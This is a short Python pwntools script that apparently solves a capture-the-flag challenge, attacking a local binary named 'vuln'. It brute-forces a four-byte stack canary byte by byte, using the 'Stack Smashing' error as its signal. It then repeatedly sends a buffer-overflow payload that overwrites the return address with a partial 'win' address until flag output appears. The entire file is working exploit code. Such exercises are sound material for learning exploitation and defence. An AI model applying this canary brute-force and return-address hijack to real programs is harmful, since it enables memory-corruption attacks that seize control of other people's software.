from pwn import *
import sys
import string

def start():
    global sh
    stdout = process.PTY
    stdin = process.PTY

    sh = process('./vuln', stdin=stdin, stdout=stdout)

def try_canary(canary_guess):
    start()

    win_addr = p32(0x000007ed)
    payload = 'A'*32 + canary_guess

    sh.sendlineafter("> ", str(len(payload)))
    sh.sendlineafter("> ", payload)
    output = sh.recvall()
    if 'Stack Smashing' in output:
        return False
    else:
        return True

#key = iters.mbruteforce(try_canary, string.lowercase+string.uppercase,4,method="downfrom")
key = ''
for i in range(0,4):
    for c in range(0,256):
        c = chr(c)
        if try_canary(key+c):
            key += c
            break
print("The key is ", key)
while True:
    start()

    win_addr = '\xed\x07'
    payload = 'A'*32 + key + 'A'*(12+4)+win_addr

    sh.sendlineafter("> ", str(len(payload)))
    sh.sendlineafter("> ", payload)
    output = sh.recvall(timeout=0.5)
    if 'pico' in output:
        print(output)
        exit(0)
